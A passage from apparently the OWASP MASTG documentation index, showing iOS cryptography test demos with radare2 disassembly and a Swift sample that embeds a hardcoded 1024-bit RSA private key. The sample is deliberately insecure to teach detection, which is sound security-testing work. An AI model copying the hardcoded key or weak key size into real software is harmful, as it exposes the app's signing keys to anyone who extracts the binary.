will be resolved by the dynamic linker at runtime to the actual address where <code>kSecAttrKeySizeInBits</code> is located in memory.</p>","tags":["ios","demo","MASTG-TEST-0209"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0011/MASTG-DEMO-0011/#evaluation","title":"Evaluation","text":"<p>In the output we can see how the <code>kSecAttrKeySizeInBits</code> attribute is set to <code>1024</code> bits (0x400 in hexadecimal) using the <code>x8</code> register. This is later used to call <code>SecKeyCreateRandomKey</code>.</p> evaluation.txt<pre><code>\u2502       \u2502   0x10000484c      080942f9       ldr x8, reloc.kSecAttrKeySizeInBits ; 0x10000c410   -&gt;  Load the address of kSecAttrKeySizeInBits into x8\n\u2502       \u2502   0x100004850      000140f9       ldr x0, [x8]\n\u2502       \u2502   0x100004854      e30b0094       bl fcn.1000077e0\n\u2502       \u2502   0x100004858      800605a9       stp x0, x1, [x20, 0x50]\n\u2502       \u2502   0x10000485c      48000090       adrp x8, reloc.Foundation.__DataStorage._bytes.allocator__UnsafeMutableRawPointer______ ; 0x10000c000\n\u2502       \u2502   0x100004860      089d41f9       ldr x8, reloc.Swift.Int    ; 0x10000c338\n\u2502       \u2502   0x100004864      883e00f9       str x8, [x20, 0x78]\n\u2502       \u2502   0x100004868      08808052       mov w8, 0x400                                       -&gt;  Move 0x400 (1024 in decimal) into w8, the lower 32 bits of x8\n\u2502       \u2502   0x10000486c      883200f9       str x8, [x20, 0x60]                                 -&gt;  Store the final value (1024-bit key size) into memory\n</code></pre> <p>The test fails because the key size is set to <code>1024</code> bits, which is considered insufficient for RSA encryption. The key size should be increased to <code>2048</code> bits or higher to provide adequate security against modern cryptographic attacks.</p>","tags":["ios","demo","MASTG-TEST-0209"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0013/MASTG-DEMO-0013/","title":"MASTG-DEMO-0013: Use of Hardcoded RSA Private Key in SecKeyCreateWithData with r2","text":"<p>  Download MASTG-DEMO-0013 IPA   Open MASTG-DEMO-0013 Folder  Build MASTG-DEMO-0013 IPA</p>","tags":["ios","demo","MASTG-TEST-0213"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0013/MASTG-DEMO-0013/#sample","title":"Sample","text":"MastgTest.swiftfunction.asmdecompiled-o1-review.swift <pre><code>import Foundation\nimport Security\n\nstruct MastgTest {\n    static func mastgTest(completion: @escaping (String) -&gt; Void) {\n\n    // Step 1: Use a hardcoded RSA private key (in DER format)\n    let privateKeyBytes: [UInt8] = [\n        0x30, 0x82, 0x02, 0x5b, 0x02, 0x01, 0x00, 0x02, 0x81, 0x81, 0x00, 0xbd, 0xf6, 0x89, 0x8f, 0xbd, \n        0x0c, 0xe6, 0x4f, 0x9a, 0x97, 0xec, 0x30, 0x1a, 0x48, 0x93, 0x4d, 0x2a, 0xbf, 0xdf, 0xf7, 0x08, \n        0x15, 0x4c, 0xdb, 0x87, 0xe5, 0xdf, 0xb1, 0xcf, 0x8d, 0xa2, 0x5e, 0x2a, 0x7d, 0x92, 0xa8, 0xbd, \n        0x30, 0xb9, 0x10, 0xcf, 0x96, 0xda, 0x10, 0x25, 0xd4, 0x67, 0xaf, 0x92, 0x26, 0xfa, 0x43, 0xb7, \n        0x86, 0x83, 0xa2, 0x68, 0xd4, 0x7a, 0x56, 0xce, 0x41, 0x41, 0xed, 0xc0, 0x10, 0x0c, 0x89, 0xa5, \n        0x4e, 0x5f, 0xc4, 0x59, 0xcc, 0x55, 0x09, 0x1f, 0xa1, 0x1f, 0x1f, 0xb7, 0x97, 0x1d, 0x53, 0x1b, \n        0x73, 0x38, 0x4c, 0x3e, 0xe8, 0x28, 0x1d, 0xc1, 0x68, 0x6a, 0x8d, 0x3e, 0xb0, 0xf2, 0x0a, 0xb3, \n        0x74, 0x26, 0xd2, 0xdc, 0xcf, 0xa4, 0xac, 0xf3, 0x5b, 0x26, 0x35, 0xd1, 0x2d, 0xee, 0x91, 0x41, \n        0xa6, 0x93, 0xed, 0x91, 0xfa, 0xd7, 0x43, 0x83, 0x85, 0x53, 0xe5, 0x02, 0x03, 0x01, 0x00, 0x01, \n        0x02, 0x81, 0x80, 0x01, 0xed, 0xbf, 0x79, 0xcd, 0xee, 0x94, 0x32, 0x73, 0x1c, 0x5f, 0x5e, 0x88, \n        0x0f, 0x62, 0x94, 0x48, 0x98, 0x3b, 0x54, 0x80, 0x8f, 0x1b, 0x9a, 0xdc, 0x9a, 0x91, 0x16, 0xaa, \n        0x14, 0x9c, 0xa8, 0x6a, 0xe6, 0x6c, 0xb0, 0xf9, 0x7f, 0x92, 0x8b, 0x0d, 0xc0, 0x84, 0x25, 0x13, \n        0xd3, 0xa6, 0x75, 0xda, 0x16, 0x3a, 0xd3, 0x0f, 0xfc, 0x8f, 0x71, 0xfc, 0x7e, 0x16, 0xfb, 0xe5, \n        0x71, 0x67, 0xc6, 0x8a, 0x4b, 0xfb, 0x12, 0x13, 0x68, 0x45, 0xd6, 0x17, 0xbd, 0xd2, 0x83, 0x69, \n        0x17, 0xc8, 0x44, 0x84, 0xb0, 0x25, 0xe4, 0x49, 0x9e, 0x51, 0x95, 0x05, 0x79, 0xe6, 0x86, 0x4a, \n        0xf6, 0xc4, 0x5e, 0x70, 0x52, 0x18, 0xf0, 0x46, 0x63, 0x42, 0x32, 0x1b, 0x07, 0x52, 0x83, 0xee, \n        0xd0, 0xbc, 0x0b, 0x6e, 0x12, 0xed, 0x27, 0xbb, 0x03, 0x31, 0xbb, 0xa5, 0x24, 0xc7, 0x2e, 0x3b, \n        0xd6, 0xe9, 0x25, 0x02, 0x41, 0x00, 0xcb, 0x78, 0x2f, 0x7f, 0x51, 0x2f, 0x49, 0xf0, 0xf8, 0xdb, \n        0x2f, 0xc3, 0x18, 0xc8, 0x41, 0x62, 0x41, 0x69, 0x4c, 0xc0, 0x78, 0x98, 0x6c, 0xce, 0xdb, 0x86, \n        0x1e, 0x04, 0x99, 0x11, 0x6c, 0x3d, 0x98, 0x8c, 0xa1, 0xcf, 0xb7, 0x48, 0xa2, 0x8b, 0x53, 0x28, \n        0x31, 0xfd, 0x15, 0x5f, 0x56, 0xc0, 0xc4, 0xc1, 0xe6, 0x25, 0x8b, 0x69, 0x83, 0xe8, 0x59, 0xd2, \n        0x2b, 0x3e, 0xe7, 0xc9, 0xbb, 0xfb, 0x02, 0x41, 0x00, 0xef, 0x01, 0xad, 0x4f, 0xdb, 0xa4, 0xb9, \n        0x59, 0x81, 0x23, 0x5e, 0xd1, 0x10, 0xee, 0x0a, 0xa3, 0x51, 0x24, 0x6f, 0x60, 0x45, 0x5c, 0xd5, \n        0x70, 0x5c, 0xa4, 0x4a, 0x32, 0x70, 0x56, 0xa2, 0x6f, 0x64, 0xaf, 0x68, 0xc9, 0x70, 0xd8, 0x93, \n        0x38, 0x86, 0x1a, 0x94, 0xc0, 0xbe, 0xb7, 0xb0, 0x9d, 0x8d, 0xb5, 0x59, 0xf6, 0x3a, 0x3a, 0xed, \n        0xd7, 0x54, 0x77, 0x57, 0x10, 0x9a, 0xad, 0x49, 0x9f, 0x02, 0x40, 0x6c, 0xf3, 0x95, 0x53, 0x72, \n        0x90, 0x84, 0xe2, 0x81, 0x0f, 0x35, 0x7b, 0x1d, 0xc9, 0x15, 0xa1, 0xdc, 0x6e, 0xdb, 0x47, 0x71, \n        0x0c, 0x05, 0xaf, 0x9a, 0xc3, 0x2d, 0x4d, 0xbe, 0xfd, 0x22, 0x5d, 0xb5, 0x53, 0x10, 0xce, 0x5e, \n        0x51, 0x89, 0xa0, 0x5b, 0x4d, 0xf9, 0xbe, 0x90, 0x74, 0x35, 0xcb, 0x11, 0x50, 0xd6, 0xc1, 0x21, \n        0xee, 0xc5, 0x50, 0x64, 0xd0, 0x72, 0x91, 0xc3, 0xa2, 0x35, 0x83, 0x02, 0x40, 0x62, 0xee, 0xd6, \n        0xc6, 0xcf, 0xac, 0x87, 0xec, 0xbc, 0xbf, 0xdf, 0x67, 0xbb, 0x12, 0x4d, 0xe4, 0xfc, 0x99, 0x90, \n        0x60, 0xd1, 0x55, 0x74, 0x24, 0x66, 0xb4, 0xba, 0xe1, 0xd6, 0x0e, 0x86, 0x7e, 0x85, 0xb6, 0xf6, \n        0x31, 0x2c, 0x3c, 0xf9, 0xf3, 0xd3, 0xce, 0xfc, 0xf4, 0x2b, 0xfd, 0xed, 0x65, 0xca, 0x5a, 0xdf, \n        0x3a, 0x45, 0x30, 0x4f, 0x73, 0x6a, 0xcb, 0x5b, 0x86, 0xcc, 0x00, 0x1f, 0x11, 0x02, 0x40, 0x5e, \n        0x6b, 0xae, 0x7c, 0x7d, 0xfc, 0x8a, 0xf5, 0x97, 0xa9, 0x39, 0x37, 0x27, 0x4e, 0xd9, 0xe8, 0xd0, \n        0x8d, 0xa9, 0x32, 0xe4, 0x6b, 0xde, 0x76, 0x0f, 0xee, 0xf1, 0x22, 0x11, 0xc4, 0x1e, 0x4a, 0x01, \n        0x73, 0xc4, 0x34, 0x8c, 0x4d, 0x16, 0xf1, 0x2f, 0x5f, 0xe4, 0xe5, 0x41, 0x3a, 0x3b, 0xf1, 0xb1, \n        0x78, 0x7c, 0x0e, 0x55, 0xf9, 0xf7, 0xcf, 0x64, 0x93, 0xad, 0x77, 0xfd, 0x31, 0x52, 0x87\n    ]\n    let privateKeyData = Data(privateKeyBytes)\n\n    let keyAttributes: [String: Any] = [\n        kSecAttrKeyType as String: kSecAttrKeyTypeRSA,\n        kSecAttrKeyClass as String: kSecAttrKeyClassPrivate,\n        kSecAttrKeySizeInBits as String: 1024,\n        kSecReturnPersistentRef as String: true\n    ]\n\n    var error: Unmanaged&lt;CFError&gt;?\n    guard let privateKey = SecKeyCreateWithData(privateKeyData as CFData, keyAttributes as CFDictionary, &amp;error) else {\n        completion(\"Failed to create private key: \\(String(describing: error))\")\n        return\n    }\n\n        guard let publicKey = SecKeyCopyPublicKey(privateKey) else {\n            completion(\"Failed to generate public key\")\n            return\n        }\n\n        // Convert the public key to data (DER format)\n        guard let publicKeyData = SecKeyCopyExternalRepresentation(publicKey, &amp;error) as Data? else {\n            completion(\"Failed to extract public key: \\(String(describing: error))\")\n            return\n        }\n\n        // Encode the public key for display\n        let publicKeyHex = publicKeyData.map { String(format: \"%02hhx\", $0) }.joined()\n\n        // Data to sign\n        let dataToSign = \"This is a sample text\".data(using: .utf8)!\n\n        // Step 2: Sign the data with the hardcoded private key\n        guard let signature = SecKeyCreateSignature(\n            privateKey,\n            SecKeyAlgorithm.rsaSignatureMessagePKCS1v15SHA256,\n            dataToSign as CFData,\n            &amp;error\n        ) else {\n            completion(\"Signing failed: \\(String(describing: error))\")\n            return\n        }\n\n        // Convert signature to hex string for display\n        let signatureHex = (signature as Data).map { String(format: \"%02hhx\", $0) }.joined()\n\n        // Step 3: Verify the signature with the public key\n        let verificationStatus = SecKeyVerifySignature(\n            publicKey,\n            SecKeyAlgorithm.rsaSignatureMessagePKCS1v15SHA256,\n            dataToSign as CFData,\n            signature as CFData,\n            &amp;error\n        )\n\n        let verificationResult = verificationStatus ? \"Signature is valid.\" : \"Signature is invalid.\"\n\n        let value = \"\"\"\n        Original: \\(String(data: dataToSign, encoding: .utf8)!)\n\n        Public Key (Hex): \\(publicKeyHex)\n\n        Signature (Hex): \\(signatureHex)\n\n        Verification: \\(verificationResult)\n        \"\"\"\n\n        completion(value)\n    }\n}\n</code></pre> <pre><code>            ; CALL XREF from sym.func.1000063c8 @ 0x100006400(x)\n\u250c 2444: sym.func.10000491c (int64_t arg1, int64_t arg2, void *arg3);\n\u2502           0x10000491c      stp x28, x27, [sp, -0x60]!\n\u2502           0x100004920      stp x26, x25, [var_10h]\n\u2502           0x100004924      stp x24, x23, [var_20h]\n\u2502           0x100004928      stp x22, x21, [var_30h]\n\u2502           0x10000492c      stp x20, x19, [var_40h]\n\u2502           0x100004930      stp x29, x30, [var_50h_2]\n\u2502           0x100004934      add x29, sp, 0x50\n\u2502           0x100004938      sub sp, sp, 0x1b0\n\u2502           0x10000493c      mov x19, sp\n\u2502           0x100004940      str x2, [x19, 0x70]                       ; arg3\n\u2502           0x100004944      mov x24, x1                               ; arg2\n\u2502           0x100004948      mov x26, x0                               ; arg1\n\u2502           0x10000494c      adrp x8, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x100004950      ldr x8, reloc.__stack_chk_guard           ; 0x10000c408\n\u2502           0x100004954      ldr x8, [x8]\n\u2502           0x100004958      stur x8, [x29, -0x60]\n\u2502           0x10000495c      mov x0, 0\n\u2502           0x100004960      bl sym Foundation...8EncodingVMa          ; sym.imp.Foundation...8EncodingVMa\n\u2502           0x100004964      ldur x8, [x0, -8]\n\u2502           0x100004968      stp x8, x0, [x19, 0x48]\n\u2502           0x10000496c      ldr x8, [x8, 0x40]\n\u2502           0x100004970      mov x9, x8\n\u2502           0x100004974      adrp x16, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x100004978      ldr x16, reloc.__chkstk_darwin            ; 0x10000c3f8\n\u2502           0x10000497c      blr x16\n\u2502           0x100004980      mov x9, sp\n\u2502           0x100004984      add x8, x8, 0xf\n\u2502           0x100004988      and x8, x8, 0xfffffffffffffff0\n\u2502           0x10000498c      sub x8, x9, x8\n\u2502           0x100004990      str x8, [x19, 0x58]\n\u2502           0x100004994      mov sp, x8\n\u2502           0x100004998      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502           0x10000499c      add x0, x0, 0x328                         ; int64_t arg1\n\u2502           0x1000049a0      bl sym.func.1000052a8\n\u2502           0x1000049a4      adrp x1, segment.__DATA                   ; 0x100010000\n\u2502           0x1000049a8      add x1, x1, 0xa8\n\u2502           0x1000049ac      bl sym.imp.swift_initStaticObject\n\u2502           0x1000049b0      mov x20, x0\n\u2502           0x1000049b4      adrp x21, segment.__DATA                  ; 0x100010000\n\u2502           0x1000049b8      add x21, x21, 0x330\n\u2502           0x1000049bc      mov x0, x21                               ; int64_t arg1\n\u2502           0x1000049c0      bl sym.func.1000052a8\n\u2502           0x1000049c4      mov x22, x0\n\u2502           0x1000049c8      stur x0, [x29, -0x70]\n\u2502           0x1000049cc      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502           0x1000049d0      add x0, x0, 0x338                         ; int64_t arg1\n\u2502           0x1000049d4      adrp x2, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x1000049d8      ldr x2, reloc.Foundation.ContiguousBytes.UInt8...szlMc ; 0x10000c338 ; int64_t arg3\n\u2502           0x1000049dc      mov x1, x21                               ; int64_t arg2\n\u2502           0x1000049e0      bl sym.func.1000053c8\n\u2502           0x1000049e4      stur x0, [x29, -0x68]\n\u2502           0x1000049e8      stur x20, [x29, -0x88]\n\u2502           0x1000049ec      sub x0, x29, 0x88                         ; int64_t arg1\n\u2502           0x1000049f0      mov x1, x22                               ; int64_t arg2\n\u2502           0x1000049f4      bl sym.func.10000532c\n\u2502           0x1000049f8      ldr x8, [x0]\n\u2502           0x1000049fc      add x0, x8, 0x20                          ; int64_t arg1\n\u2502           0x100004a00      ldr x8, [x8, 0x10]\n\u2502           0x100004a04      add x1, x0, x8                            ; int64_t arg2\n\u2502           0x100004a08      bl sym.func.1000047b8\n\u2502           0x100004a0c      mov x25, x0\n\u2502           0x100004a10      mov x28, x1\n\u2502           0x100004a14      sub x0, x29, 0x88                         ; int64_t arg1\n\u2502           0x100004a18      bl sym.func.100005350\n\u2502           0x100004a1c      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502           0x100004a20      add x0, x0, 0x340                         ; int64_t arg1\n\u2502           0x100004a24      bl sym.func.1000052a8\n\u2502           0x100004a28      add x1, x19, 0x98                         ; void *arg1\n\u2502           0x100004a2c      bl sym.imp.swift_initStackObject          ; void *swift_initStackObject(void *arg0, void *arg1)\n\u2502           0x100004a30      mov x20, x0\n\u2502           0x100004a34      adrp x8, 0x100007000\n\u2502           0x100004a38      ldr q0, [x8, 0xad0]\n\u2502           0x100004a3c      str q0, [x0, 0x10]\n\u2502           0x100004a40      adrp x8, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x100004a44      ldr x8, reloc.kSecAttrKeyType             ; 0x10000c438\n\u2502           0x100004a48      ldr x0, [x8]\n\u2502           0x100004a4c      bl sym Foundation...nconditionallyBridgeFromObjectiveCySSSo8NSStringCSgFZ ; sym.imp.Foundation...nconditionallyBridgeFromObjectiveCySSSo8NSStringCSgFZ\n\u2502           0x100004a50      mov x21, x20\n\u2502           0x100004a54      str x0, [x21, 0x20]!\n\u2502           0x100004a58      str x1, [x20, 0x28]\n\u2502           0x100004a5c      adrp x8, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x100004a60      ldr x8, reloc.kSecAttrKeyTypeRSA          ; 0x10000c440\n\u2502           0x100004a64      ldr x23, [x8]\n\u2502           0x100004a68      mov x0, 0\n\u2502           0x100004a6c      bl sym.func.100005370\n\u2502           0x100004a70      mov x22, x0\n\u2502           0x100004a74      str x0, [x20, 0x48]\n\u2502           0x100004a78      str x23, [x20, 0x30]\n\u2502           0x100004a7c      adrp x8, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x100004a80      ldr x8, reloc.kSecAttrKeyClass            ; 0x10000c420\n\u2502           0x100004a84      ldr x0, [x8]\n\u2502           0x100004a88      bl sym Foundation...nconditionallyBridgeFromObjectiveCySSSo8NSStringCSgFZ ; sym.imp.Foundation...nconditionallyBridgeFromObjectiveCySSSo8NSStringCSgFZ\n\u2502           0x100004a8c      stp x0, x1, [x20, 0x50]\n\u2502           0x100004a90      adrp x8, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x100004a94      ldr x8, reloc.kSecAttrKeyClassPrivate     ; 0x10000c428\n\u2502           0x100004a98      ldr x27, [x8]\n\u2502           0x100004a9c      str x22, [x20, 0x78]\n\u2502           0x100004aa0      mov x22, x28\n\u2502           0x100004aa4      str x27, [x20, 0x60]\n\u2502           0x100004aa8      adrp x8, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x100004aac      ldr x8, reloc.kSecAttrKeySizeInBits       ; 0x10000c430\n\u2502           0x100004ab0      ldr x0, [x8]\n\u2502           0x100004ab4      bl sym Foundation...nconditionallyBridgeFromObjectiveCySSSo8NSStringCSgFZ ; sym.imp.Foundation...nconditionallyBridgeFromObjectiveCySSSo8NSStringCSgFZ\n\u2502           0x100004ab8      stp x0, x1, [x20, 0x80]\n\u2502           0x100004abc      adrp x8, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x100004ac0      ldr x8, reloc....SiN                      ; 0x10000c350\n\u2502           0x100004ac4      str x8, [x20, 0xa8]\n\u2502           0x100004ac8      mov w8, 0x400\n\u2502           0x100004acc      str x8, [x20, 0x90]\n\u2502           0x100004ad0      adrp x8, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x100004ad4      ldr x8, reloc.kSecReturnPersistentRef     ; 0x10000c450\n\u2502           0x100004ad8      ldr x0, [x8]\n\u2502           0x100004adc      bl sym Foundation...nconditionallyBridgeFromObjectiveCySSSo8NSStringCSgFZ ; sym.imp.Foundation...nconditionallyBridgeFromObjectiveCySSSo8NSStringCSgFZ\n\u2502           0x100004ae0      stp x0, x1, [x20, 0xb0]\n\u2502           0x100004ae4      adrp x8, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x100004ae8      ldr x8, reloc....SbN                      ; 0x10000c348\n\u2502           0x100004aec      str x8, [x20, 0xd8]\n\u2502           0x100004af0      mov w8, 1\n\u2502           0x100004af4      strb w8, [x20, 0xc0]\n\u2502           0x100004af8      bl sym.imp.objc_retain_x23\n\u2502           0x100004afc      mov x23, x25\n\u2502           0x100004b00      bl sym.imp.objc_retain_x27\n\u2502           0x100004b04      mov x0, x20                               ; int64_t arg1\n\u2502           0x100004b08      bl sym.func.100004820\n\u2502           0x100004b0c      mov x25, x0\n\u2502           0x100004b10      mov x0, x20\n\u2502           0x100004b14      bl sym.imp.swift_setDeallocating\n\u2502           0x100004b18      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502           0x100004b1c      add x0, x0, 0x348                         ; int64_t arg1\n\u2502           0x100004b20      bl sym.func.1000052a8\n\u2502           0x100004b24      mov x2, x0\n\u2502           0x100004b28      mov x0, x21\n\u2502           0x100004b2c      mov w1, 4\n\u2502           0x100004b30      bl sym.imp.swift_arrayDestroy\n\u2502           0x100004b34      str xzr, [x19, 0x90]\n\u2502           0x100004b38      mov x0, x23\n\u2502           0x100004b3c      mov x1, x28\n\u2502           0x100004b40      bl sym Foundation.Data._bridgeToObjectiveC.NSData...F ; sym.imp.Foundation.Data._bridgeToObjectiveC.NSData...F\n\u2502           0x100004b44      mov x20, x0\n\u2502           0x100004b48      adrp x8, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x100004b4c      ldr x8, reloc....ypN                      ; 0x10000c3c8\n\u2502           0x100004b50      add x2, x8, 8\n\u2502           0x100004b54      adrp x1, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x100004b58      ldr x1, reloc....SSN                      ; 0x10000c320\n\u2502           0x100004b5c      adrp x3, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x100004b60      ldr x3, [x3, 0x328]\n\u2502           0x100004b64      mov x0, x25\n\u2502           0x100004b68      bl sym Foundationbool...ridgeToObjectiveCSo12NSDictionaryCyF ; sym.imp.Foundationbool...ridgeToObjectiveCSo12NSDictionaryCyF\n\u2502           0x100004b6c      mov x21, x0\n\u2502           0x100004b70      add x2, x19, 0x90\n\u2502           0x100004b74      mov x0, x20\n\u2502           0x100004b78      mov x1, x21\n\u2502           0x100004b7c      bl sym.imp.SecKeyCreateWithData\n\u2502           0x100004b80      mov x28, x0\n\u2502           0x100004b84      bl sym.imp.objc_release_x20\n\u2502           0x100004b88      bl sym.imp.objc_release_x21\n\u2502       \u250c\u2500&lt; 0x100004b8c      cbz x28, 0x100004f68\n\u2502       \u2502   0x100004b90      stp x26, x24, [x19, 0x60]\n\u2502       \u2502   0x100004b94      mov x0, x28\n\u2502       \u2502   0x100004b98      bl sym.imp.SecKeyCopyPublicKey\n\u2502      \u250c\u2500\u2500&lt; 0x100004b9c      cbz x0, 0x100005028\n\u2502      \u2502\u2502   0x100004ba0      str x25, [x19, 0x38]\n\u2502      \u2502\u2502   0x100004ba4      mov x21, 0x10\n\u2502      \u2502\u2502   0x100004ba8      movk x21, 0xd000, lsl 48\n\u2502      \u2502\u2502   0x100004bac      add x1, x19, 0x90\n\u2502      \u2502\u2502   0x100004bb0      mov x26, x0\n\u2502      \u2502\u2502   0x100004bb4      bl sym.imp.SecKeyCopyExternalRepresentation\n\u2502      \u2502\u2502   0x100004bb8      ldp x24, x25, [x19, 0x68]\n\u2502      \u2502\u2502   0x100004bbc      ldr x27, [x19, 0x60]\n\u2502     \u250c\u2500\u2500\u2500&lt; 0x100004bc0      cbz x0, 0x100005098\n\u2502     \u2502\u2502\u2502   0x100004bc4      mov x20, x0\n\u2502     \u2502\u2502\u2502   0x100004bc8      stp x22, x26, [x19, 0x28]\n\u2502     \u2502\u2502\u2502   0x100004bcc      str x23, [x19, 0x20]\n\u2502     \u2502\u2502\u2502   0x100004bd0      bl sym Foundation.Data._unconditionallyBridgeFromObjectiveC.NSData...gFZ ; sym.imp.Foundation.Data._unconditionallyBridgeFromObjectiveC.NSData...gFZ\n\u2502     \u2502\u2502\u2502   0x100004bd4      mov x26, x0\n\u2502     \u2502\u2502\u2502   0x100004bd8      mov x24, x1\n\u2502     \u2502\u2502\u2502   0x100004bdc      bl sym.imp.objc_release_x20\n\u2502     \u2502\u2502\u2502   0x100004be0      mov x0, x26                               ; int64_t arg1\n\u2502     \u2502\u2502\u2502   0x100004be4      mov x1, x24                               ; int64_t arg2\n\u2502     \u2502\u2502\u2502   0x100004be8      mov x25, 0x10\n\u2502     \u2502\u2502\u2502   0x100004bec      movk x25, 0xd000, lsl 48\n\u2502     \u2502\u2502\u2502   0x100004bf0      mov x21, 0\n\u2502     \u2502\u2502\u2502   0x100004bf4      bl sym.func.100004000\n\u2502     \u2502\u2502\u2502   0x100004bf8      mov x23, x0\n\u2502     \u2502\u2502\u2502   0x100004bfc      stur x0, [x29, -0x88]\n\u2502     \u2502\u2502\u2502   0x100004c00      adrp x20, segment.__DATA                  ; 0x100010000\n\u2502     \u2502\u2502\u2502   0x100004c04      add x20, x20, 0x360\n\u2502     \u2502\u2502\u2502   0x100004c08      mov x0, x20                               ; int64_t arg1\n\u2502     \u2502\u2502\u2502   0x100004c0c      bl sym.func.1000052a8\n\u2502     \u2502\u2502\u2502   0x100004c10      mov x27, x0\n\u2502     \u2502\u2502\u2502   0x100004c14      adrp x0, segment.__DATA                   ; 0x100010000\n\u2502     \u2502\u2502\u2502   0x100004c18      add x0, x0, 0x368                         ; int64_t arg1\n\u2502     \u2502\u2502\u2502   0x100004c1c      adrp x2, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502     \u2502\u2502\u2502   0x100004c20      ldr x2, reloc....SayxGSKsMc               ; 0x10000c340 ; int64_t arg3\n\u2502     \u2502\u2502\u2502   0x100004c24      mov x1, x20                               ; int64_t arg2\n\u2502     \u2502\u2502\u2502   0x100004c28      bl sym.func.1000053c8\n\u2502     \u2502\u2502\u2502   0x100004c2c      mov x22, x0\n\u2502     \u2502\u2502\u2502   0x100004c30      sub x20, x29, 0x88\n\u2502     \u2502\u2502\u2502   0x100004c34      mov x0, 0\n\u2502     \u2502\u2502\u2502   0x100004c38      mov x1, -0x2000000000000000\n\u2502     \u2502\u2502\u2502   0x100004c3c      str x27, [x19, 0x10]\n\u2502     \u2502\u2502\u2502   0x100004c40      mov x2, x27\n\u2502     \u2502\u2502\u2502   0x100004c44      mov x3, x22\n\u2502     \u2502\u2502\u2502   0x100004c48      bl sym Element...F                        ; sym.imp.Element...F\n\u2502     \u2502\u2502\u2502   0x100004c4c      str x0, [x19, 8]\n\u2502     \u2502\u2502\u2502   0x100004c50      str x1, [x19, 0x18]\n\u2502     \u2502\u2502\u2502   0x100004c54      mov x0, x23                               ; void *arg0\n\u2502     \u2502\u2502\u2502   0x100004c58      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502     \u2502\u2502\u2502   0x100004c5c      add x8, x25, 5\n\u2502     \u2502\u2502\u2502   0x100004c60      adrp x9, 0x100008000\n\u2502     \u2502\u2502\u2502   0x100004c64      add x9, x9, 0x540                         ; 0x100008540 ; \"This is a sample text\"\n\u2502     \u2502\u2502\u2502   0x100004c68      sub x9, x9, 0x20\n\u2502     \u2502\u2502\u2502   0x100004c6c      orr x9, x9, 0x8000000000000000\n\u2502     \u2502\u2502\u2502   0x100004c70      stp x8, x9, [x29, -0x88]\n\u2502     \u2502\u2502\u2502   0x100004c74      ldr x23, [x19, 0x58]\n\u2502     \u2502\u2502\u2502   0x100004c78      mov x8, x23\n\u2502     \u2502\u2502\u2502   0x100004c7c      bl sym Foundation...8EncodingV4utf8ACvgZ  ; sym.imp.Foundation...8EncodingV4utf8ACvgZ\n\u2502     \u2502\u2502\u2502   0x100004c80      bl sym.func.100005408\n\u2502     \u2502\u2502\u2502   0x100004c84      mov x3, x0\n\u2502     \u2502\u2502\u2502   0x100004c88      adrp x2, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502     \u2502\u2502\u2502   0x100004c8c      ldr x2, reloc....SSN                      ; 0x10000c320\n\u2502     \u2502\u2502\u2502   0x100004c90      sub x20, x29, 0x88\n\u2502     \u2502\u2502\u2502   0x100004c94      mov x0, x23\n\u2502     \u2502\u2502\u2502   0x100004c98      mov w1, 0\n\u2502     \u2502\u2502\u2502   0x100004c9c      bl sym Foundation...btF                   ; sym.imp.Foundation...btF\n\u2502     \u2502\u2502\u2502   0x100004ca0      str x0, [x19, 0x40]\n\u2502     \u2502\u2502\u2502   0x100004ca4      mov x20, x1\n\u2502     \u2502\u2502\u2502   0x100004ca8      ldp x8, x1, [x19, 0x48]\n\u2502     \u2502\u2502\u2502   0x100004cac      ldr x8, [x8, 8]\n\u2502     \u2502\u2502\u2502   0x100004cb0      mov x0, x23\n\u2502     \u2502\u2502\u2502   0x100004cb4      blr x8\n\u2502     \u2502\u2502\u2502   0x100004cb8      ldur x0, [x29, -0x80]                     ; void *arg0\n\u2502     \u2502\u2502\u2502   0x100004cbc      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502     \u2502\u2502\u2502   0x100004cc0      lsr x8, x20, 0x3c\n\u2502     \u2502\u2502\u2502   0x100004cc4      cmp x8, 0xe\n\u2502     \u2502\u2502\u2502   0x100004cc8      mov x25, 0x10\n\u2502     \u2502\u2502\u2502   0x100004ccc      movk x25, 0xd000, lsl 48\n\u2502    \u250c\u2500\u2500\u2500\u2500&lt; 0x100004cd0      b.hi 0x100005280\n\u2502    \u2502\u2502\u2502\u2502   0x100004cd4      adrp x8, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502    \u2502\u2502\u2502\u2502   0x100004cd8      ldr x8, reloc.kSecKeyAlgorithmRSASignatureMessagePKCS1v15SHA256 ; 0x10000c448\n\u2502    \u2502\u2502\u2502\u2502   0x100004cdc      ldr x23, [x8]\n\u2502  